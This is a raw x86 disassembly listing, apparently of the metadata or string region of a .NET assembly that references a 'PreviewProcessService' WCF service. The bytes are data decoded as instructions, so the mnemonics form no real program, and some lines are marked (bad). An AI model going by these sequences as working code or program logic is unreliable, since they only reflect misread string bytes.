  408612:	add    BYTE PTR [eax],al
  408614:	add    BYTE PTR [eax+eax*1],al
  408617:	add    BYTE PTR [edx],dl
  408619:	sbb    eax,0x1010005
  40861e:	adc    bl,BYTE PTR ds:0xe010004
  408624:	push   cs
  408625:	add    al,0x8
  408627:	add    BYTE PTR [edx],dl
  408629:	sbb    eax,0x6e004930
  40862e:	add    BYTE PTR [esi+0x0],dh
  408631:	popa   
  408632:	add    BYTE PTR [eax+eax*1+0x69],ch
  408636:	add    BYTE PTR [eax+eax*1+0x43],ah
  40863a:	add    BYTE PTR [edi+0x0],ch
  40863d:	ins    DWORD PTR es:[edi],dx
  40863e:	add    BYTE PTR [ebp+0x0],ch
  408641:	popa   
  408642:	add    BYTE PTR [esi+0x0],ch
  408645:	add    BYTE PTR fs:[eax+eax*1+0x69],cl
  40864a:	add    BYTE PTR [esi+0x0],ch
  40864d:	add    BYTE PTR gs:[edi+0x0],cl
  408651:	jo     0x408653
  408653:	je     0x408655
  408655:	imul   eax,DWORD PTR [eax],0x6e006f
  40865b:	xor    al,0x44
  40865d:	add    BYTE PTR [ebp+0x0],dh
  408660:	jo     0x408662
  408662:	ins    BYTE PTR es:[edi],dx
  408663:	add    BYTE PTR [ecx+0x0],ch
  408666:	arpl   WORD PTR [eax],ax
  408668:	popa   
  408669:	add    BYTE PTR [eax+eax*1+0x65],dh
  40866d:	add    BYTE PTR [ebx+0x0],al
  408670:	outs   dx,DWORD PTR ds:[esi]
  408671:	add    BYTE PTR [ebp+0x0],ch
  408674:	ins    DWORD PTR es:[edi],dx
  408675:	add    BYTE PTR [ecx+0x0],ah
  408678:	outs   dx,BYTE PTR ds:[esi]
  408679:	add    BYTE PTR [eax+eax*1+0x4c],ah
  40867d:	add    BYTE PTR [ecx+0x0],ch
  408680:	outs   dx,BYTE PTR ds:[esi]
  408681:	add    BYTE PTR [ebp+0x0],ah
  408684:	dec    edi
  408685:	add    BYTE PTR [eax+0x0],dh
  408688:	je     0x40868a
  40868a:	imul   eax,DWORD PTR [eax],0x6e006f
  408690:	and    al,0x4d
  408692:	add    BYTE PTR [ecx+0x0],ch
  408695:	jae    0x408697
  408697:	jae    0x408699
  408699:	imul   eax,DWORD PTR [eax],0x67006e
  40869f:	dec    edi
  4086a0:	add    BYTE PTR [eax+0x0],dh
  4086a3:	je     0x4086a5
  4086a5:	imul   eax,DWORD PTR [eax],0x6e006f
  4086ab:	push   esi
  4086ac:	add    BYTE PTR [ecx+0x0],ah
  4086af:	ins    BYTE PTR es:[edi],dx
  4086b0:	add    BYTE PTR [ebp+0x0],dh
  4086b3:	add    BYTE PTR gs:[esi],ah
  4086b6:	push   ebx
  4086b7:	add    BYTE PTR [ebp+0x0],dh
  4086ba:	arpl   WORD PTR [eax],ax
  4086bc:	arpl   WORD PTR [eax],ax
  4086be:	add    BYTE PTR gs:[ebx+0x0],dh
  4086c2:	jae    0x4086c4
  4086c4:	data16 add BYTE PTR [ebp+0x0],dh
  4086c8:	ins    BYTE PTR es:[edi],dx
  4086c9:	add    BYTE PTR [ebp+0x0],al
  4086cc:	js     0x4086ce
  4086ce:	add    BYTE PTR gs:[ebx+0x0],ah
  4086d2:	jne    0x4086d4
  4086d4:	je     0x4086d6
  4086d6:	imul   eax,DWORD PTR [eax],0x6e006f
  4086dc:	add    eax,DWORD PTR [esi]
  4086de:	adc    ah,BYTE PTR [ecx]
  4086e0:	add    eax,DWORD PTR [esi]
  4086e2:	adc    bl,BYTE PTR ds:0xe020006
  4086e8:	push   cs
  4086e9:	sbb    eax,0x1206031c
  4086ee:	and    BYTE PTR [ebx],al
  4086f0:	push   es
  4086f1:	adc    ah,BYTE PTR ds:0x8010005
  4086f7:	sbb    eax,0x20040e
  4086fc:	adc    ch,BYTE PTR [ecx]
  4086fe:	add    eax,0x12010120
  408703:	sub    DWORD PTR [eax+eax*1],eax
  408706:	add    BYTE PTR [edx],dl
  408708:	and    BYTE PTR [ebx],al
  40870a:	add    BYTE PTR [eax],al
  40870c:	add    DWORD PTR [eax+ecx*1],eax
  40870f:	add    BYTE PTR [edx],dl
  408711:	and    BYTE PTR [edi],cl
  408713:	and    BYTE PTR [ecx+eax*1],al
  408716:	adc    ch,BYTE PTR ds:0x12153112
  40871c:	xor    eax,0x12391201
  408721:	cmp    eax,0x1022007
  408726:	adc    ch,BYTE PTR ds:0x200a3112
  40872c:	add    ebx,DWORD PTR [eax+edx*1]
  40872f:	adc    al,BYTE PTR [ecx+0x12]
  408732:	inc    ebp
  408733:	adc    cl,BYTE PTR [ecx+0x7]
  408736:	and    BYTE PTR [edx],al
  408738:	add    DWORD PTR [eax],edx
  40873a:	adc    al,BYTE PTR [ecx+0x1c]
  40873d:	add    al,0x20
  40873f:	add    DWORD PTR [ecx],eax
  408741:	push   cs
  408742:	add    al,0x20
  408744:	add    BYTE PTR ds:0x1200505,bl
  40874a:	add    DWORD PTR ds:0x1200605,ebx
  408750:	sbb    eax,0x7021005
  408755:	and    BYTE PTR [ebx],al
  408757:	sbb    eax,0xe0e0e05
  40875c:	or     DWORD PTR [eax],esp
  40875e:	add    al,0x1d
  408760:	add    eax,0x100e0e0e
  408765:	push   cs
  408766:	push   es
  408767:	and    BYTE PTR [edx],al
  408769:	or     BYTE PTR [esi],cl
  40876b:	adc    BYTE PTR [esi],cl
  40876d:	add    al,0x20
  40876f:	add    DWORD PTR [eax],ecx
  408771:	push   cs
  408772:	or     DWORD PTR [eax],esp
  408774:	add    eax,0xe0e0e08
  408779:	add    dl,BYTE PTR [eax]
  40877b:	push   cs
  40877c:	push   es
  40877d:	and    BYTE PTR [ebx],al
  40877f:	or     BYTE PTR [eax],cl
  408781:	or     BYTE PTR [esi],cl
  408783:	pop    es
  408784:	and    BYTE PTR [edx],al
  408786:	push   cs
  408787:	push   cs
  408788:	adc    BYTE PTR ds:0x1200505,bl
  40878e:	sbb    eax,0x20070e05
  408793:	add    bl,BYTE PTR ds:0xe100e05
  408799:	or     DWORD PTR [eax],esp
  40879b:	add    al,0x1
  40879d:	push   cs
  40879e:	push   cs
  40879f:	adc    BYTE PTR [esi],cl
  4087a1:	adc    BYTE PTR [esi],cl
  4087a3:	push   es
  4087a4:	and    BYTE PTR [edx],al
  4087a6:	push   cs
  4087a7:	push   cs
  4087a8:	adc    BYTE PTR [edx],al
  4087aa:	add    eax,0xe010220
  4087af:	add    cl,BYTE PTR [edx]
  4087b1:	and    BYTE PTR ds:0x1d0e0e01,al
  4087b7:	add    eax,0x3051d0e
  4087bc:	push   es
  4087bd:	adc    dh,BYTE PTR [ebx+eax*1]
  4087c0:	push   es
  4087c1:	adc    dl,BYTE PTR [eax+0x7]
  4087c4:	and    BYTE PTR [edx],al
  4087c6:	add    DWORD PTR [edx],edx
  4087c8:	xor    al,0x12
  4087ca:	push   eax
  4087cb:	push   es
  4087cc:	and    BYTE PTR [ecx],al
  4087ce:	sbb    eax,0x54d1205
  4087d3:	and    BYTE PTR [ecx],al
  4087d5:	adc    dl,BYTE PTR [ecx+0xe]
  4087d8:	add    eax,0x55120120
  4087dd:	push   cs
  4087de:	push   es
  4087df:	and    BYTE PTR [edx],al
  4087e1:	add    DWORD PTR [esi],ecx
  4087e3:	sbb    eax,0x1200405
  4087e8:	add    cl,BYTE PTR [esi]
  4087ea:	or     ah,BYTE PTR [eax]
  4087ec:	add    al,0x1
  4087ee:	adc    cl,BYTE PTR [ebp+0xe]
  4087f1:	adc    BYTE PTR [esi],cl
  4087f3:	adc    BYTE PTR [esi],cl
  4087f5:	pop    es
  4087f6:	and    BYTE PTR [edx],al
  4087f8:	push   cs
  4087f9:	adc    cl,BYTE PTR [ebp+0x10]
  4087fc:	add    al,BYTE PTR [esi]
  4087fe:	and    BYTE PTR [edx],al
  408800:	add    DWORD PTR [edx],edx
  408802:	dec    ebp
  408803:	add    al,BYTE PTR ds:0x12010120
  408809:	pop    ecx
  40880a:	sbb    BYTE PTR [ecx+0x0],al
  40880d:	arpl   WORD PTR [eax],ax
  40880f:	arpl   WORD PTR [eax],ax
  408811:	add    BYTE PTR gs:[ebx+0x0],dh
  408815:	jae    0x408817
  408817:	inc    esp
  408818:	add    BYTE PTR [ebp+0x0],ah
  40881b:	outs   dx,BYTE PTR ds:[esi]
  40881c:	add    BYTE PTR [ecx+0x0],ch
  40881f:	add    BYTE PTR gs:[eax+eax*1+0x3],ah
  408824:	push   es
  408825:	adc    bl,BYTE PTR [ecx+0x2]
  408828:	push   es
  408829:	sbb    al,0x3
  40882b:	push   es
  40882c:	adc    bl,BYTE PTR [ebp+0x5]
  40882f:	and    BYTE PTR [ecx],al
  408831:	add    DWORD PTR [edx],edx
  408833:	dec    esp
  408834:	or     ah,BYTE PTR [eax]
  408836:	add    eax,0x120e0e01
  40883b:	popa   
  40883c:	push   cs
  40883d:	adc    ah,BYTE PTR [ebp+0x4]
  408840:	and    BYTE PTR [eax],al
  408842:	adc    ah,BYTE PTR [ecx+0x5]
  408845:	and    BYTE PTR [ecx],al
  408847:	add    DWORD PTR [edx],edx
  408849:	popa   
  40884a:	add    al,0x20
  40884c:	add    BYTE PTR [edx],dl
  40884e:	gs add eax,0x12010120
  408854:	add    eax,DWORD PTR gs:[esi]
  408857:	adc    ah,BYTE PTR [ecx+0x3]
  40885a:	push   es
  40885b:	adc    ah,BYTE PTR [ebp+0x4]
  40885e:	sub    BYTE PTR [eax],al
  408860:	adc    ah,BYTE PTR [ecx+0x4]
  408863:	sub    BYTE PTR [eax],al
  408865:	adc    ah,BYTE PTR [ebp+0x3]
  408868:	push   es
  408869:	adc    ch,BYTE PTR [ecx+0x6]
  40886c:	and    BYTE PTR [edx],al
  40886e:	add    DWORD PTR [edx],edx
  408870:	pop    ecx
  408871:	add    al,BYTE PTR [ecx]
  408873:	add    DWORD PTR [esi],eax
  408875:	and    BYTE PTR [ecx],al
  408877:	add    DWORD PTR [ecx],edx
  408879:	sub    BYTE PTR [ecx+0x1012004],0x8
  408880:	and    BYTE PTR [eax+0x2400],0x4
  408887:	add    BYTE PTR [eax],0x0
  40888a:	xchg   esp,eax
  40888b:	add    BYTE PTR [eax],al
  40888d:	add    BYTE PTR [esi],al
  40888f:	add    al,BYTE PTR [eax]
  408891:	add    BYTE PTR [eax],al
  408893:	and    al,0x0
  408895:	add    BYTE PTR [edx+0x53],dl
  408898:	inc    ecx
  408899:	xor    DWORD PTR [eax],eax
  40889b:	add    al,0x0
  40889d:	add    BYTE PTR [ecx],al
  40889f:	add    BYTE PTR [ecx],al
  4088a1:	add    BYTE PTR [edi],ah
  4088a3:	daa    
  4088a4:	lods   eax,DWORD PTR ss:[esi]
  4088a6:	outs   dx,BYTE PTR ds:[esi]
  4088a7:	pop    edi
  4088a8:	xchg   ebp,eax
  4088a9:	xchg   BYTE PTR [edx-0x15ce2a3e],bh
  4088af:	mov    esp,0x6c66cc3a
  4088b4:	das    
  4088b5:	mov    cs,eax
  4088b7:	jns    0x4088b3
  4088b9:	xchg   esp,eax
  4088ba:	clc    
  4088bb:	div    DWORD PTR [eax-0xdd082ce]
  4088c1:	in     eax,dx
  4088c2:	push   edx
  4088c3:	xor    al,0x48
  4088c5:	clc    
  4088c6:	cmp    al,0x3d
  4088c8:	pop    esp
  4088c9:	pop    ebp
  4088ca:	rcr    bh,cl
  4088cc:	(bad)  
  4088cd:	mov    esp,0x6b28c599
  4088d2:	sub    al,0x12
  4088d4:	push   ecx
  4088d5:	pop    ss
  4088d6:	mov    edi,0x2b24be5c
  4088db:	popf   
  4088dc:	inc    ecx
  4088dd:	jne    0x4088e6
  4088df:	xor    dh,BYTE PTR [edx+0x49e6ffbd]
  4088e5:	(bad)  
  4088e6:	out    dx,eax
  4088e7:	mov    eax,0x526d52e5
  4088ec:	outs   dx,DWORD PTR ds:[esi]
  4088ed:	fst    QWORD PTR [ebx]
  4088ef:	add    BYTE PTR [ebp-0xd842414],dl
  4088f5:	adc    BYTE PTR [eax-0x27259364],al
  4088fb:	or     BYTE PTR [edi-0x56],0x9a
  4088ff:	shl    BYTE PTR [ecx],0xa
  408902:	ret    
  408903:	retf   
  408904:	mov    ds:0x562305aa,al
  408909:	jnp    0x408938
  40890b:	cli    
  40890c:	jg     0x4088f0
  40890e:	push   eax
  40890f:	mov    bl,0xf
  408911:	lods   al,BYTE PTR ds:[esi]
  408912:	mov    ebp,0x99ecd462
  408917:	mov    ecx,0x7d7cc44a
  40891c:	cmp    ebp,DWORD PTR [eax]
  40891e:	icebp  
  40891f:	mul    ah
  408921:	enter  0x4,0x1
  408925:	add    DWORD PTR [esi],ecx
  408927:	add    eax,0x80120000
  40892c:	mov    ecx,0x2040708
  408931:	or     BYTE PTR [edx],dl
  408933:	cmp    BYTE PTR [ebp+0x1070308],0x8
  40893a:	add    al,0x20
  40893c:	add    DWORD PTR [ebx],eax
  40893e:	or     BYTE PTR [eax+eax*1],al
  408941:	add    DWORD PTR [edx],eax
  408943:	add    eax,DWORD PTR ds:0x80e0220
  408949:	or     BYTE PTR [esi],al
  40894b:	add    BYTE PTR [ebx],al
  40894d:	push   cs
  40894e:	push   cs
  40894f:	push   cs
  408950:	push   cs
  408951:	push   es
  408952:	add    BYTE PTR [edx],al
  408954:	add    eax,DWORD PTR [ebx]
  408956:	adc    bl,BYTE PTR ds:0xe012004
  40895c:	or     BYTE PTR [eax+eiz*1],al
  40895f:	add    DWORD PTR [eax],ecx
  408961:	or     BYTE PTR [ecx],cl
  408963:	pop    es
  408964:	push   es
  408965:	sbb    eax,0x3080802
  40896a:	or     BYTE PTR [esi],cl
  40896c:	add    al,0x7
  40896e:	add    DWORD PTR ds:0x220061c,ebx
  408974:	push   cs
  408975:	push   cs
  408976:	adc    bl,BYTE PTR ds:0xe030009
  40897c:	adc    al,BYTE PTR [eax+0x1c1d0ed5]
  408982:	add    eax,DWORD PTR [edi]
  408984:	add    DWORD PTR [esi],ecx
  408986:	or     BYTE PTR [eax],al
  408988:	add    DWORD PTR [edx],edx
  40898a:	sbb    cl,0x11
  40898d:	sbb    ch,0x5
  408990:	and    BYTE PTR [eax],al
  408992:	adc    al,BYTE PTR [eax+0x2005e1]
  408998:	adc    al,BYTE PTR [eax+0x22007e5]
  40899e:	add    DWORD PTR [esi],ecx
  4089a0:	adc    al,BYTE PTR [eax+0x30602e5]
  4089a6:	add    al,0x0
  4089a8:	add    DWORD PTR [ecx],eax
  4089aa:	sbb    al,0x18
  4089ac:	pop    es
  4089ad:	or     bl,BYTE PTR ds:0x29122912
  4089b3:	adc    ch,BYTE PTR [ecx]
  4089b5:	adc    al,BYTE PTR [eax+0x121d08bd]
  4089bb:	sub    DWORD PTR ds:0x1d082912,ebx
  4089c1:	adc    ch,BYTE PTR [ecx]
  4089c3:	or     BYTE PTR ds:0x1c010220,al
  4089c9:	sbb    BYTE PTR ds:0x80120000,al
  4089cf:	cmc    
  4089d0:	add    al,0x0
  4089d2:	add    DWORD PTR [esi],ecx
  4089d4:	or     BYTE PTR [edi],al
  4089d6:	and    BYTE PTR [edx],al
  4089d8:	add    DWORD PTR [esi],ecx
  4089da:	adc    DWORD PTR [ecx+0x2200801],eax
  4089e0:	add    DWORD PTR [ebx*1+0x6fd8012],ebx
  4089e7:	add    BYTE PTR [ecx],al
  4089e9:	add    DWORD PTR [edx],edx
  4089eb:	add    DWORD PTR ds:0x1203200b,0xd9801239
  4089f5:	adc    al,BYTE PTR [ecx+0x20040e0d]
  4089fb:	add    BYTE PTR [edx],dl
  4089fd:	sub    eax,0x15002009
  408a02:	adc    al,BYTE PTR [ecx+0xd120111]
  408a08:	push   es
  408a09:	adc    eax,0x12013512
  408a0e:	or     eax,0x1012005
  408a13:	adc    eax,DWORD PTR [eax]
  408a15:	adc    DWORD PTR [edi],eax
  408a17:	push   es
  408a18:	adc    al,BYTE PTR [eax+ecx*1+0x12]
  408a1c:	cmp    ch,0x12
  408a1f:	sub    DWORD PTR [edx],edx
  408a21:	add    DWORD PTR ds:0xfd80121d,0x102200a
  408a2b:	adc    al,BYTE PTR [eax-0x7fede227]
  408a31:	std    
  408a32:	sysret 
  408a34:	add    eax,0xfd801208
  408a39:	adc    ch,BYTE PTR [ecx]
  408a3b:	adc    al,BYTE PTR [ecx-0x7fede2fb]
  408a41:	std    
  408a42:	add    al,0x0
  408a44:	add    DWORD PTR [edx],eax
  408a46:	push   cs
  408a47:	push   es
  408a48:	add    BYTE PTR [ecx],al
  408a4a:	adc    al,BYTE PTR [ecx+0x7050e1d]
  408a50:	add    DWORD PTR [edx],edx
  408a52:	sbb    DWORD PTR ds:0x12002005,0x15082581
  408a5c:	adc    al,BYTE PTR [ecx-0x7eedfed7]
  408a62:	sub    eax,0x15002009
  408a67:	adc    al,BYTE PTR [ecx+0x130131]
  408a6d:	or     BYTE PTR ds:0x1318112,dl
  408a73:	adc    al,BYTE PTR [ecx+0x20042d]
  408a79:	adc    eax,DWORD PTR [eax]
  408a7b:	or     ah,BYTE PTR [eax]
  408a7d:	add    BYTE PTR ds:0x1298112,dl
  408a83:	adc    al,BYTE PTR [ecx+0x12150839]
  408a89:	sub    DWORD PTR [ecx],0x39811201
  408a8f:	or     BYTE PTR ds:0x1318112,dl
  408a95:	adc    al,BYTE PTR [ecx+0x200539]
  408a9b:	adc    al,BYTE PTR [ecx+0x20093d]
  408aa1:	adc    eax,0x1298112
  408aa6:	adc    dl,BYTE PTR [ecx]
  408aa8:	pop    es
  408aa9:	adc    eax,0x1298112
  408aae:	adc    dl,BYTE PTR [ecx]
  408ab0:	sbb    BYTE PTR [edi],al
  408ab2:	add    al,0x12
  408ab4:	xor    DWORD PTR ds:0x15398112,0x1318112
  408abe:	adc    al,BYTE PTR [ecx-0x7eedead3]
  408ac4:	xor    DWORD PTR [ecx],eax
  408ac6:	adc    al,BYTE PTR [ecx+0x539]
  408acc:	adc    al,BYTE PTR [ecx+0x200545]
  408ad2:	adc    al,BYTE PTR [ecx+0x200549]
  408ad8:	adc    al,BYTE PTR [ecx+0x54d]
  408ade:	adc    al,BYTE PTR [ecx+0x2000551]
  408ae4:	add    cl,BYTE PTR [esi]
  408ae6:	push   cs
  408ae7:	add    al,0x7
  408ae9:	add    cl,BYTE PTR [esi]
  408aeb:	push   cs
  408aec:	xor    BYTE PTR [ecx],al
  408aee:	add    BYTE PTR [ecx],al
  408af0:	add    BYTE PTR [esi+ecx*1+0x9],dl
  408af4:	dec    esi
  408af5:	popa   
  408af6:	ins    DWORD PTR es:[edi],dx
  408af7:	gs jae 0x408b6a
  408afa:	popa   
  408afb:	arpl   WORD PTR [ebp+0x1f],sp
  408afe:	push   0x3a707474
  408b03:	das    
  408b04:	das    
  408b05:	push   eax
  408b06:	jb     0x408b6d
  408b08:	jbe    0x408b73
  408b0a:	gs ja  0x408b5d
  408b0d:	jb     0x408b7e
  408b0f:	arpl   WORD PTR [ebp+0x73],sp
  408b12:	jae    0x408b7d
  408b14:	outs   dx,BYTE PTR ds:[esi]
  408b15:	addr16 push ebx
  408b17:	gs jb  0x408b90
  408b1a:	imul   esp,DWORD PTR [ebx+0x65],0x10881
  408b21:	add    eax,DWORD PTR [eax]
  408b23:	push   esp
  408b24:	push   cs
  408b25:	or     DWORD PTR [esi+0x61],ecx
  408b28:	ins    DWORD PTR es:[edi],dx
  408b29:	gs jae 0x408b9c
  408b2c:	popa   
  408b2d:	arpl   WORD PTR [ebp+0x1f],sp
  408b30:	push   0x3a707474
  408b35:	das    
  408b36:	das    
  408b37:	push   eax
  408b38:	jb     0x408b9f
  408b3a:	jbe    0x408ba5
  408b3c:	gs ja  0x408b8f
  408b3f:	jb     0x408bb0
  408b41:	arpl   WORD PTR [ebp+0x73],sp
  408b44:	jae    0x408baf
  408b46:	outs   dx,BYTE PTR ds:[esi]
  408b47:	addr16 push ebx
  408b49:	gs jb  0x408bc2
  408b4c:	imul   esp,DWORD PTR [ebx+0x65],0x43105054
  408b53:	popa   
  408b54:	ins    BYTE PTR es:[edi],dx
  408b55:	ins    BYTE PTR es:[edi],dx
  408b56:	bound  esp,QWORD PTR [ecx+0x63]
  408b59:	imul   eax,DWORD PTR [ebx+0x6f],0x6e
  408b5d:	je     0x408bd1
  408b5f:	popa   
  408b60:	arpl   WORD PTR [edx+edi*1+0x4d],si
  408b64:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  408b6b:	je     0x408b9b
  408b6d:	push   edx
  408b6e:	gs jo  0x408be0
  408b71:	jb     0x408be7
  408b73:	imul   ebp,DWORD PTR [esi+0x67],0x6572502e
  408b7a:	jbe    0x408be5
  408b7c:	gs ja  0x408bc7
  408b7f:	outs   dx,DWORD PTR ds:[esi]
  408b80:	jae    0x408bf6
  408b82:	cs dec ecx
  408b84:	push   eax
  408b85:	jb     0x408bec
  408b87:	jbe    0x408bf2
  408b89:	gs ja  0x408bdc
  408b8c:	jb     0x408bfd
  408b8e:	arpl   WORD PTR [ebp+0x73],sp
  408b91:	jae    0x408bfc
  408b93:	outs   dx,BYTE PTR ds:[esi]
  408b94:	addr16 inc ebx
  408b96:	popa   
  408b97:	ins    BYTE PTR es:[edi],dx
  408b98:	ins    BYTE PTR es:[edi],dx
  408b99:	bound  esp,QWORD PTR [ecx+0x63]
  408b9c:	imul   edx,DWORD PTR [ebp+edx*2+0x77],0x53
  408ba1:	jns    0x408c16
  408ba3:	je     0x408c0a
  408ba5:	ins    DWORD PTR es:[edi],dx
  408ba6:	cs push ebx
  408ba8:	gs jb  0x408c21
  408bab:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  408bb2:	ins    BYTE PTR es:[edi],dx
  408bb3:	cs push ebx
  408bb5:	gs jae 0x408c2b
  408bb8:	imul   ebp,DWORD PTR [edi+0x6e],0x65646f4d
  408bbf:	sub    al,0x20
  408bc1:	push   ebx
  408bc2:	jns    0x408c37
  408bc4:	je     0x408c2b
  408bc6:	ins    DWORD PTR es:[edi],dx
  408bc7:	cs push ebx
  408bc9:	gs jb  0x408c42
  408bcc:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  408bd3:	ins    BYTE PTR es:[edi],dx
  408bd4:	sub    al,0x20
  408bd6:	push   esi
  408bd7:	gs jb  0x408c4d
  408bda:	imul   ebp,DWORD PTR [edi+0x6e],0x302e343d
  408be1:	xor    BYTE PTR cs:[esi],ch
  408be4:	xor    BYTE PTR [eax+eiz*1],ch
  408be7:	inc    ebx
  408be8:	jne    0x408c56
  408bea:	je     0x408c61
  408bec:	jb     0x408c53
  408bee:	cmp    eax,0x7475656e
  408bf3:	jb     0x408c56
  408bf5:	ins    BYTE PTR es:[edi],dx
  408bf6:	sub    al,0x20
  408bf8:	push   eax
  408bf9:	jne    0x408c5d
  408bfb:	ins    BYTE PTR es:[edi],dx
  408bfc:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  408c03:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  408c07:	bound  esi,QWORD PTR [edi]
  408c09:	aaa    
  408c0a:	popa   
  408c0b:	xor    eax,0x31363563
  408c10:	cmp    DWORD PTR [ebx],esi
  408c12:	xor    al,0x65
  408c14:	xor    BYTE PTR [eax],bh
  408c16:	cmp    DWORD PTR [ebx],ecx
  408c18:	push   ebx
  408c19:	gs jae 0x408c8f
  408c1c:	imul   ebp,DWORD PTR [edi+0x6e],0x65646f4d
  408c23:	add    DWORD PTR [eax],eax
  408c25:	add    BYTE PTR [eax],al
  408c27:	adc    eax,0x10001
  408c2c:	push   esp
  408c2d:	add    cl,BYTE PTR ds:0x65547349
  408c33:	jb     0x408ca2
  408c35:	imul   ebp,DWORD PTR [esi+0x61],0x676e6974
  408c3c:	add    DWORD PTR [ebx],eax
  408c3e:	push   es
  408c3f:	sbb    eax,0x12060305
  408c44:	cmp    BYTE PTR [esi],al
  408c46:	adc    eax,0x15d8112
  408c4b:	push   cs
  408c4c:	add    al,0x7
  408c4e:	add    DWORD PTR [edx],edx
  408c50:	push   esp
  408c51:	add    al,0x7
  408c53:	add    DWORD PTR [edx],edx
  408c55:	pop    eax
  408c56:	add    eax,0x1d1c0100
  408c5b:	add    eax,0x12010704
  408c60:	pop    esp
  408c61:	add    al,0x7
  408c63:	add    DWORD PTR [edx],edx
  408c65:	pusha  
  408c66:	add    eax,DWORD PTR [esi]
  408c68:	adc    cl,BYTE PTR [ebp+0x4]
  408c6b:	pop    es
  408c6c:	add    DWORD PTR [edx],edx
  408c6e:	fs add al,0x7
  408c71:	add    DWORD PTR [edx],edx
  408c73:	push   0x12010704
  408c78:	ins    BYTE PTR es:[edi],dx
  408c79:	or     BYTE PTR [eax],al
  408c7b:	add    DWORD PTR [edx],edx
  408c7d:	cmp    BYTE PTR [ebp+0x56d8112],0x7
  408c84:	add    DWORD PTR [edx],edx
  408c86:	sub    DWORD PTR [ebp-0x80],0x100019e
  408c8d:	add    BYTE PTR [ebp+edx*2+0x7f],dl
  408c91:	push   ebx
  408c92:	jns    0x408d07
  408c94:	je     0x408cfb
  408c96:	ins    DWORD PTR es:[edi],dx
  408c97:	cs push ebx
  408c99:	gs jb  0x408d12
  408c9c:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  408ca3:	ins    BYTE PTR es:[edi],dx
  408ca4:	cs dec ecx
  408ca6:	outs   dx,BYTE PTR ds:[esi]
  408ca7:	jae    0x408d1d
  408ca9:	popa   
  408caa:	outs   dx,BYTE PTR ds:[esi]
  408cab:	arpl   WORD PTR [ebp+0x43],sp
  408cae:	outs   dx,DWORD PTR ds:[esi]
  408caf:	outs   dx,BYTE PTR ds:[esi]
  408cb0:	je     0x408d17
  408cb2:	js     0x408d28
  408cb4:	dec    ebp
  408cb5:	outs   dx,DWORD PTR ds:[esi]
  408cb6:	fs gs sub al,0x20
  408cba:	push   ebx
  408cbb:	jns    0x408d30
  408cbd:	je     0x408d24
  408cbf:	ins    DWORD PTR es:[edi],dx
  408cc0:	cs push ebx
  408cc2:	gs jb  0x408d3b
  408cc5:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  408ccc:	ins    BYTE PTR es:[edi],dx
  408ccd:	sub    al,0x20
  408ccf:	push   esi
  408cd0:	gs jb  0x408d46
  408cd3:	imul   ebp,DWORD PTR [edi+0x6e],0x302e343d
  408cda:	xor    BYTE PTR cs:[esi],ch
  408cdd:	xor    BYTE PTR [eax+eiz*1],ch
  408ce0:	inc    ebx
  408ce1:	jne    0x408d4f
  408ce3:	je     0x408d5a
  408ce5:	jb     0x408d4c
  408ce7:	cmp    eax,0x7475656e
  408cec:	jb     0x408d4f
  408cee:	ins    BYTE PTR es:[edi],dx
  408cef:	sub    al,0x20
  408cf1:	push   eax
  408cf2:	jne    0x408d56
  408cf4:	ins    BYTE PTR es:[edi],dx
  408cf5:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  408cfc:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  408d00:	bound  esi,QWORD PTR [edi]
  408d02:	aaa    
  408d03:	popa   
  408d04:	xor    eax,0x31363563
  408d09:	cmp    DWORD PTR [ebx],esi
  408d0b:	xor    al,0x65
  408d0d:	xor    BYTE PTR [eax],bh
  408d0f:	cmp    DWORD PTR [ebx],edx
  408d11:	dec    ecx
  408d12:	outs   dx,BYTE PTR ds:[esi]
  408d13:	jae    0x408d89
  408d15:	popa   
  408d16:	outs   dx,BYTE PTR ds:[esi]
  408d17:	arpl   WORD PTR [ebp+0x43],sp
  408d1a:	outs   dx,DWORD PTR ds:[esi]
  408d1b:	outs   dx,BYTE PTR ds:[esi]
  408d1c:	je     0x408d83
  408d1e:	js     0x408d94
  408d20:	dec    ebp
  408d21:	outs   dx,DWORD PTR ds:[esi]
  408d22:	fs add al,BYTE PTR gs:[eax]
  408d26:	add    BYTE PTR [eax],al
  408d28:	or     eax,DWORD PTR [eax]
  408d2a:	add    dl,BYTE PTR [edx]
  408d2c:	cmp    DWORD PTR [ecx+0x12],0x81127981
  408d33:	jns    0x408d41
  408d35:	adc    BYTE PTR [ecx],al
  408d37:	add    ebx,DWORD PTR [esi]
  408d39:	add    BYTE PTR [eax],dl
  408d3b:	push   ds
  408d3c:	add    BYTE PTR [esi],bl
  408d3e:	add    BYTE PTR [esi],bl
  408d40:	add    BYTE PTR [edx+ecx*1],al
  408d43:	add    DWORD PTR [edx],edx
  408d45:	pop    ecx
  408d46:	or     BYTE PTR [edi],al
  408d48:	add    edx,DWORD PTR [edx]
  408d4a:	pop    ecx
  408d4b:	adc    bl,BYTE PTR [ecx+0x12]
  408d4e:	pop    ecx
  408d4f:	adc    DWORD PTR [edx+0x1],0x54000300
  408d56:	push   ebp
  408d57:	jnp    0x408dac
  408d59:	jns    0x408dce
  408d5b:	je     0x408dc2
  408d5d:	ins    DWORD PTR es:[edi],dx
  408d5e:	cs push ebx
  408d60:	gs jb  0x408dd9
  408d63:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  408d6a:	ins    BYTE PTR es:[edi],dx
  408d6b:	cs inc ebx
  408d6d:	outs   dx,DWORD PTR ds:[esi]
  408d6e:	outs   dx,BYTE PTR ds:[esi]
  408d6f:	arpl   WORD PTR [ebp+0x72],si
  408d72:	jb     0x408dd9
  408d74:	outs   dx,BYTE PTR ds:[esi]
  408d75:	arpl   WORD PTR [ecx+0x4d],di
  408d78:	outs   dx,DWORD PTR ds:[esi]
  408d79:	fs gs sub al,0x20
  408d7d:	push   ebx
  408d7e:	jns    0x408df3
  408d80:	je     0x408de7
  408d82:	ins    DWORD PTR es:[edi],dx
  408d83:	cs push ebx
  408d85:	gs jb  0x408dfe
  408d88:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  408d8f:	ins    BYTE PTR es:[edi],dx
  408d90:	sub    al,0x20
  408d92:	push   esi
  408d93:	gs jb  0x408e09
